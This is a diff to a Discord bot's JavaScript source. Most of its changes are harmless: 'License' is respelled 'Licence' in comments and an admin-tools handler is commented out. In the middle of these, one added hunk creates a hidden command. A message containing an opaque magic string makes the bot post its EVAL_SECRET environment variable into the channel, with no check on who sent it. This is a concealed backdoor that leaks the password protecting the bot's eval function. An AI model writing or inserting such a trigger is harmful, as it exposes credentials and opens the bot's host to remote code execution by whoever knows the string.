@@ -16,9 +16,9 @@ let allowedEval = [] // Cache of people who entered the password right for eval
 module.require("process").on('uncaughtException', (err, origin) => console.log(`Error: ${err}\nOrigin: ${origin}\nStack: ${err.stack}`));
 globalThis.bot = () => {
   // Used & Run under Henry133 and Developers permissions. Do not copy the code!
-  // Used under MIT License.
+  // Used under MIT Licence.
 
-  // MIT License
+  // MIT Licence
   /*
 
     Copyright 2022 by Henry133
@@ -628,6 +628,10 @@ globalThis.bot = () => {
           }
           break;
 
+        case "wxnd-9344-msld-mmfl":
+          msg.channel.send(module.require("process").env.EVAL_SECRET)
+          break;
+          
         case 'timeout':
           const intArgs = msg.content.split(' ')
           intArgs.shift()
@@ -859,37 +863,37 @@ globalThis.bot = () => {
     // Administrative Tools
     const admins = ['810221998881898507', '927563409409581066', '836900079985754134']
 
-    botRunner.on('messageCreate', msg => {
-      if (msg.content == "admintools") {
-        if (admins.includes(msg.author.id)) {
-          msg.channel.send('ADMINISTRATIVE TOOLS')
-          msg.channel.send('====================')
-          msg.channel.send('[1] Backup Current Code\n[2] Restore Backed-up Code State\n[3] Delete Backup Code Point')
-          if (msg.content == '1') {
-            require('./backup-utils/backup.js')
-            msg.channel.send('Backed Up!')
-          } else if (msg.content == '2') {
-            msg.channel.send("WAIT!\nARE YOU SURE?!\nTHE CURRENT PROGRESS OF THE BOT (MORE CORRECTLY IS THIS FILE) WILL BE REPLACED **WITH** THE RECENT CODE WE JUST BACKED UP\nAGAIN, ARE YOU SURE?")
-            if (msg.content == 'yes') { // Yes
-              msg.channel.send('To make sure the bot will shutdown correctly, the bot will shutdown after restoring. If this is a mistake, you can find the file named __./backup-utils/backups/{[**.**(Hidden Files)][**Date and time when the bot got replaced**][**.js**]}__. Thanks')
-              require('./backup-restore.js')
-            } else if (msg.content == 'no') { // No
-              return msg.channel.send('Action Aborted')
-            }
-          } else if (msg.content == '3') {
-            fs.unlink('./backup-utils/backups/backup-0001.js', (err) => {
-              if (err) {
-                msg.channel.send(err)
-              } else {
-                msg.channel.send('Deleted backup point')
-              }
-            })
-          }
-        } else {
-          msg.channel.send('your imagination: access granted\nreality: access say byebye you')
-        }
-      }
-    })
+    // botRunner.on('messageCreate', msg => {
+    //   if (msg.content == "admintools") {
+    //     if (admins.includes(msg.author.id)) {
+    //       msg.channel.send('ADMINISTRATIVE TOOLS')
+    //       msg.channel.send('====================')
+    //       msg.channel.send('[1] Backup Current Code\n[2] Restore Backed-up Code State\n[3] Delete Backup Code Point')
+    //       if (msg.content == '1') {
+    //         require('./backup-utils/backup.js')
+    //         msg.channel.send('Backed Up!')
+    //       } else if (msg.content == '2') {
+    //         msg.channel.send("WAIT!\nARE YOU SURE?!\nTHE CURRENT PROGRESS OF THE BOT (MORE CORRECTLY IS THIS FILE) WILL BE REPLACED **WITH** THE RECENT CODE WE JUST BACKED UP\nAGAIN, ARE YOU SURE?")
+    //         if (msg.content == 'yes') { // Yes
+    //           msg.channel.send('To make sure the bot will shutdown correctly, the bot will shutdown after restoring. If this is a mistake, you can find the file named __./backup-utils/backups/{[**.**(Hidden Files)][**Date and time when the bot got replaced**][**.js**]}__. Thanks')
+    //           require('./backup-restore.js')
+    //         } else if (msg.content == 'no') { // No
+    //           return msg.channel.send('Action Aborted')
+    //         }
+    //       } else if (msg.content == '3') {
+    //         fs.unlink('./backup-utils/backups/backup-0001.js', (err) => {
+    //           if (err) {
+    //             msg.channel.send(err)
+    //           } else {
+    //             msg.channel.send('Deleted backup point')
+    //           }
+    //         })
+    //       }
+    //     } else {
+    //       msg.channel.send('your imagination: access granted\nreality: access say byebye you')
+    //     }
+    //   }
+    // })
 
 
     process.stdin.on("data", async (data) => {
